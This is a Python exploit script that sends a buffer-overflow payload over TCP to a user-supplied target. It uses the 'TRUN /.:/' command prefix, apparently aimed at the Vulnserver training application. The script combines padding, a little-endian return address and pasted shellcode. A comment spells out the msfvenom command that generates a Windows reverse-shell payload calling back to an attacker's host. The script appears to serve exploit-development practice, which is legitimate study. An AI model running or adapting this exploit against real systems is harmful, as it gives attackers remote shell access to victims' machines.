#! /usr/bin/python
#################################################################################################
# Author: Nicholas Fisher
# Date: July 7th 2024
# Description of Script
# This Python script facilitates the deployment of a Windows shellcode payload to a specified
# network target. It prompts the user to input characters, multipliers, architecture details 
# in Little Endian format, and the generated shellcode obtained from a tool like `msfvenom`. 
# Using socket programming, it establishes a TCP connection to the target IPv4 address and port, 
# sending a crafted payload derived from user inputs. The script includes robust error handling
# for socket errors, value errors, and other exceptions, ensuring informative error messages 
# and proper script termination upon encountering issues.
#################################################################################################
import sys  # Importing the sys module for system-specific parameters and functions
import socket  # Importing the socket module for network connections

# Prompt the user to enter the first character
char1 = input("Enter the first character here: ")

# Prompt the user to enter the first multiplier and convert it to an integer
int1 = int(input("Enter the first multiplier here: "))

# Prompt the user to enter the architecture value in Little Endian format
archval = input("Enter the x86 architecture value in Little Endian format here: ")

# Prompts the user for the generated shellcode from the msfvenom -p windows/shell_reverse_tcp LHOST=<IP address> LPORT=<port> EXITFUNC=thread -f c -a x86 -b “\x00” command
overflow = input("Enter the Generated Shellcode here: ")

# Create the shellcode pattern by repeating the characters according to the multipliers
shellcode = char1 * int1 + archval + overflow

try:
    # Create a socket object with IPv4 addressing and TCP connection
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Ask the user to input the target IPv4 address and store it in the variable 'IPv4'
    IPv4 = input("Please enter the IPv4 address of the target: ")

    # Ask the user to input the target TCP port and convert it to an integer, then store it in the variable 'TCP'
    TCP = int(input("Please enter the TCP port of the target: "))

    # Attempt to connect to the target at the provided IPv4 address and TCP port
    soc.connect((IPv4, TCP))

    # Send a payload containing the pattern to the target
    payload = 'TRUN /.:/' + shellcode
    soc.send(payload.encode('utf-8'))

    # Close the socket connection
    soc.close()
except socket.error as e:
    # Print an error message if a socket error occurs and print the exception message
    print(f"Unable to establish connection with the host... womp womp\nError: {e}")

    # Exit the script with a non-zero status to indicate an error
    sys.exit(1)
except ValueError as e:
    # Print an error message if there is a value error (e.g., invalid port number) and print the exception message
    print(f"Invalid input... womp womp\nError: {e}")

    # Exit the script with a non-zero status to indicate an error
    sys.exit(1)
except Exception as e:
    # Print a general error message for any other exceptions and print the exception message
    print(f"An unexpected error occurred... womp womp\nError: {e}")

    # Exit the script with a non-zero status to indicate an error
    sys.exit(1)
